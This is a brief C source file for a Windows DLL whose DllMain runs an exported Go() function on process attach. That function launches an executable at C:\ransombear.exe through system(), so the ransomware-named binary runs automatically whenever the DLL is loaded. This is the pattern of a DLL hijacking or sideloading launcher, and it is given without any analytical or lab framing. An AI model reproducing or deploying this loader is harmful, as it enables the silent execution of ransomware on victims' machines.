#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>



extern __declspec(dllexport) int Go(void);
int Go(void) {

	system("C:\\ransombear.exe");
	
	return 0;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		Go();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
